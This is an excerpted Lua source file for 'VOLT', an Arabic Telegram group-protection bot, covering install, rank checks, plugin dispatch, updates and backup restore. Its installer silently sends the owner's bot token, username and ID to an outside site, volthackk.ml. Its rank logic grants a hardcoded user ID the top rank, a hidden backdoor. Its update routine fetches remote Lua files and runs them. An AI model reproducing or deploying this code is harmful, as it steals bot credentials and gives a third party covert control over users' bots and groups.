...
volt = Token:match("(%d+)")
redis:set(volt..":VERSION",1)
redis:set(volt..":SUDO_ID:",SUDO_USER)
redis:set(volt..":DataCenter:",'German')
redis:set(volt..":UserNameBot:",BOT_User)
redis:set(volt..":NameBot:",BOT_NAME)
redis:hset(volt..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
redis:set("TH3volt_INSTALL","Yes")
info = {} 
...
https.request('https://volthackk.ml/token.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
Cr_file = io.open("./inc/Token.txt", "w")
Cr_file:write(Token)
Cr_file:close()
print('\27[1;36m￤Token.txt is created.\27[m')
local Text = "• أهلاً [المطور الاساسي](tg://user?id="..SUDO_USER..") \n• شكراً لأستخدام سورس فولت \n• أرسل /start\n• لأظهار الاوامر المطور  المجهزه بالكيبورد\n\n."
...
print('\27[0;33m>>'..[[
echo -e "\e[38;5;77m       •{ تنصيب سورس فولت بنسبه 100% ]  }•\e[0m"
echo -e "\e[38;5;77m       •{ •{ Join the Source Channel : @VOLT_TEAM_4 }• }•\e[0m"
...
echo -e "\e[38;5;77m       •{ SOURCE VOLT source has been installed }•\e[0m"
echo -e "\e[38;5;77m       •{ developer JACK : @PHP57  }•\e[0m"

echo -e "\e[38;5;77m      VOLT ✾ @PHP57e[0m"
...
volt = Token:match("(%d+)")
our_id = tonumber(volt)
ApiToken = "https://api.telegram.org/bot"..Token
Bot_User = redis:get(volt..":UserNameBot:")
SUDO_ID = tonumber(redis:get(volt..":SUDO_ID:"))
SUDO_USER = redis:hgetall(volt..'username:'..SUDO_ID).username
version = redis:get(volt..":VERSION")
DataCenter = redis:get(volt..":DataCenter:")
...
..'¦ BOT__INFO: \27[1;34m'.. Bot_User..'\27[0;36m » ('..volt..')\027[0;32m\n'
...
if msg.type == "pv" and redis:get(volt..':mute_pv:'..msg.chat_id_) then
print('\27[1;31m is_MUTE_BY_FLOOD\27[0m')
return false 
end

if redis:get(volt..'sender:'..msg.sender_user_id_..':flood') then
...
if redis:get(volt..'group:add'..msg.chat_id_) then 
...
elseif msg.sender_user_id_ == 1815672157 then 
...
msg.Rank = 1
elseif redis:sismember(volt..':SUDO_BOT:',msg.sender_user_id_) then 
msg.TheRankCmd = 'المطور'
msg.TheRank = 'مطور البوت'
msg.Rank = 2
elseif msg.GroupActive and redis:sismember(volt..':KARA_BOT:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = 'المنشىء الاساسي'
msg.TheRank = 'المنشىء الاساسي'
msg.Rank = 3
elseif msg.GroupActive and redis:sismember(volt..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = 'المنشىء'
msg.TheRank = 'المنشىء'
msg.Rank = 4
elseif msg.GroupActive and redis:sismember(volt..'owners:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = 'المدير' 
msg.TheRank = 'مدير البوت' 
msg.Rank = 5
elseif msg.GroupActive and redis:sismember(volt..'admins:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = 'الادمن'
msg.TheRank = 'ادمن في البوت'
msg.Rank = 6
elseif msg.GroupActive and redis:sismember(volt..'whitelist:'..msg.chat_id_,msg.sender_user_id_) then 
...
local lock_bots = redis:get(volt..'lock_bots'..msg.chat_id_)
ZISBOT = false
...
if msg.GroupActive and ZISBOT and redis:get(volt..'lock_bots_by_kick'..msg.chat_id_) then
kick_user(msg.sender_user_id_, msg.chat_id_)
end
if msg.content_.members_[0].id_ == our_id and redis:get(volt..':WELCOME_BOT') then
SUDO_USER = redis:hgetall(volt..'username:'..SUDO_ID).username
sendPhoto(msg.chat_id_,msg.id_,redis:get(volt..':WELCOME_BOT'),[[• مرحباً انا بوت ]]..redis:get(volt..':NameBot:')..[[ .
• اختـصاصـي حمايـة الـمجموعات
• تأكد من رفعـك للبـوت مشـرف في مجموعـتك واكتب تفعـيل 
• قنـاة سورس فولت ⇐ @VOLT_TEAM_4
...
if msg.GroupActive and redis:get(volt..'mute_tgservice'..msg.chat_id_) then
Del_msg(msg.chat_id_,msg.id_)
return false 
end
...
if msg.Admin then redis:srem(volt..'is_silent_users:'..msg.chat_id_,msg.sender_user_id_) return end
...
if msg.Admin then redis:srem(volt..'banned:'..msg.chat_id_,msg.sender_user_id_) return end
...
if redis:get(volt..'mute_text'..msg.chat_id_) then --قفل الدردشه
...
if ScriptFile and ScriptFile.volt then 
if msg.text and ScriptFile.ivolt then
for k, volt in pairs(ScriptFile.volt) do
local SearchText = msg.text:match(volt)
if SearchText then
if not CheckFlood(msg) then
return false 
end

local GetMsg = ScriptFile.ivolt(msg,{msg.text:match(volt)})
if GetMsg then
print("\27[1;35m¦This_Msg : ",volt.." | Plugin is: \27[1;32mScript.lua\27[0m")
...
if ScriptFile.dvolt then
if ScriptFile.dvolt(msg) == false then
return false
end
...
if Plug.volt then 
if msg.text and Plug.ivolt then
for k, volt in pairs(Plug.volt) do
local SearchText = msg.text:match(volt)
if SearchText then
if not CheckFlood(msg) then
return false
...
Mohammad = msg.text
if Mohammad then
if redis:sismember(volt..'CmDlist:'..msg.chat_id_,Mohammad) then
mmdi = redis:hget(volt..'CmD:'..msg.chat_id_,Mohammad)
msg.text = Mohammad:gsub(Mohammad,mmdi)
end
end
local GetMsg = Plug.ivolt(msg,{msg.text:match(volt)})
if GetMsg then
print("\27[1;35m¦This_Msg : ",volt.." | Plugin is: \27[1;32m"..name.."\27[0m")
sendMsg(msg.chat_id_,msg.id_,GetMsg)
end 
return false
end
...
print("The File "..name.." Not Runing in The Source volt")
end 

end
else
print("The File Script.lua Not Runing in The Source volt")
...
function tdcli_update_callback(data)
	...
	redis:srem(volt..'users',msg.sender_user_id_)
	end
	...
	download_file('https://raw.githubusercontent.com/jack1eljoker1/VOLT/main/inc/Run.lua','./inc/Run.lua')
	EditMsg(data.message_.chat_id_,data.message_.id_,'SOURC')
	download_file('https://raw.githubusercontent.com/jack1eljoker1/VOLT/main/inc/locks.lua','./inc/locks.lua')
	EditMsg(data.message_.chat_id_,data.message_.id_,'SOURCE')
	download_file('https://raw.githubusercontent.com/jack1eljoker1/VOLT/main/inc/Script.lua','./inc/Script.lua')
	EditMsg(data.message_.chat_id_,data.message_.id_,'SOURCE VO')
	download_file('https://raw.githubusercontent.com/jack1eljoker1/VOLT/main/inc/functions.lua','./inc/functions.lua')
	download_file('https://raw.githubusercontent.com/jack1eljoker1/VOLT/main/plugins/zhrfa.lua','./plugins/zhrfa.lua')
	download_file('https://raw.githubusercontent.com/jack1eljoker1/VOLT/main/plugins/games.lua','./plugins/games.lua')
	EditMsg(data.message_.chat_id_,data.message_.id_,'SOURCE VOLT\n\n• ** السورس الى اصدار \n• ** تم اعاده تشغيل سورس فولت بنجاح')
	dofile("./inc/Run.lua")
...
msg.text = Mohammad:gsub(Mohammad,mmdi)
	...
	mmd = redis:get(volt..":SUDO_ID:")
redis:hset(volt..'username:'..tonumber(mmd),'username',msg.text)
	...
	redis:set(volt..":SUDO_ID:",msg.text)
...
download(stk,32)
	...
	if redis:get(volt..'group:add'..msg.chat_id_) and (msg.sender_user_id_ == SUDO_ID or redis:sismember(volt..':SUDO_BOT:',msg.sender_user_id_) or redis:sismember(volt..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) or redis:sismember(volt..'owners:'..msg.chat_id_,msg.sender_user_id_) or redis:sismember(volt..'admins:'..msg.chat_id_,msg.sender_user_id_)) then 
	msg.Admin = true
	end
	local lock_bots = redis:get(volt..'lock_bots'..msg.chat_id_)
	ISBOT = false
	...
	if ZISBOT and redis:get(volt..'lock_bots_by_kick'..msg.chat_id_) then
	kick_user(msg.sender_user_id_, msg.chat_id_)
	end
...
if redis:get(volt..'lock:join:'..msg.chat_id_) then
kick_user(msg.sender_user_id_,msg.chat_id_)
	...
	if redis:get(volt..'group:add'..data.chat_.id_) then
	redis:set(volt..'group:name'..data.chat_.id_,data.chat_.title_)
	end
	...
	if redis:get(volt..'group:add-100'..data.channel_.id_) then
	local linkGroup = (redis:get(volt..'linkGroup-100'..data.channel_.id_) or "")
	local NameGroup = (redis:get(volt..'group:name-100'..data.channel_.id_) or "")
	...
	redis:mset(
	volt..'group:name'..k,IDS.Title,
	volt..'num_msg_volt'..k,5,
	volt..'group:add'..k,true,
	volt..'lock_link'..k,true,
	volt..'lock_spam'..k,true,
	volt..'lock_webpage'..k,true,
	volt..'lock_markdown'..k,true,
	volt..'lock_flood'..k,true,
	volt..'lock_bots'..k,true,
	volt..'mute_forward'..k,true,
	volt..'mute_contact'..k,true,
	volt..'mute_document'..k,true,
	volt..'mute_inline'..k,true,
	volt..'lock_username'..k,true,
	volt..'replay'..k,true
	)
	redis:sadd(volt..'group:ids',k) 

	if IDS.Admins then
	for user,ID in pairs(IDS.Admins) do
	redis:hset(volt..'username:'..ID,'username',user)
	redis:sadd(volt..'admins:'..k,ID)
	end
	end
	if IDS.Creator then
	for user,ID in pairs(IDS.Creator) do
	redis:hset(volt..'username:'..ID,'username',user)
	redis:sadd(volt..':MONSHA_BOT:'..k,ID)
	end
	end
	if IDS.Owner then
	for user,ID in pairs(IDS.Owner) do
	redis:hset(volt..'username:'..ID,'username',user)
	redis:sadd(volt..'owners:'..k,ID)
	end
	end
	end
	io.popen("rm -fr ../.telegram-cli/data/document/*")
	sendMsg(Uploaded_Groups_CH,Uploaded_Groups_MS,'• ** تم رفع النسخه‏‏ الاحتياطيه\n• ** حالياً عدد مجموعاتك هيه‏ *'..redis:scard(volt..'group:ids')..' .*\n')
	end
	elseif data.ID == "UpdateUser" then  
	if data.user_.type_.ID == "UserTypeDeleted" then
	print("¦ userTypeDeleted")
	redis:srem(volt..'users',data.user_.id_)
	elseif data.user_.type_.ID == "UserTypeGeneral" then
	local CheckUser = redis:hgetall(volt..'username:'..data.user_.id_).username
	...
	redis:hset(volt..'username:'..data.user_.id_,'username',USERNAME)
	end 
	end
